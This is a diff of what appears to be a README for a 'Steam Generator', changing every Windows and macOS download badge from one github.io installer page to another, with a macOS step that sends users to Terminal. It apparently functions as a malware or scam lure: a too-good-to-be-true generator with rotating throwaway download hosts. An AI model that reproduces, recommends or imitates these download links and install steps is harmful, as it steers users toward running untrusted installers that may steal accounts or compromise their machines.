@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Steam_Generator-1B2838?style=for-the-badge&logo=steam)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download](https://img.shields.io/badge/⬇_Download_Steam_Generator-1B2838?style=for-the-badge&logo=steam)](https://supremedeckhandwire.github.io/win-pkg/)
 
 </div>
 
@@ -59,9 +59,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://TerminusAgentLine.github.io/macos-setup/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
 
 </div>
 
@@ -74,7 +74,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Steam_Generator-1B2838?style=for-the-badge&logo=steam)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download](https://img.shields.io/badge/⬇_Download_Steam_Generator-1B2838?style=for-the-badge&logo=steam)](https://supremedeckhandwire.github.io/win-pkg/)
 
 </div>
 
@@ -105,7 +105,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://TerminusAgentLine.github.io/macos-setup/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -130,7 +130,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Steam_Generator-1B2838?style=for-the-badge&logo=steam)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download](https://img.shields.io/badge/⬇_Download_Steam_Generator-1B2838?style=for-the-badge&logo=steam)](https://supremedeckhandwire.github.io/win-pkg/)
 
 </div>
 
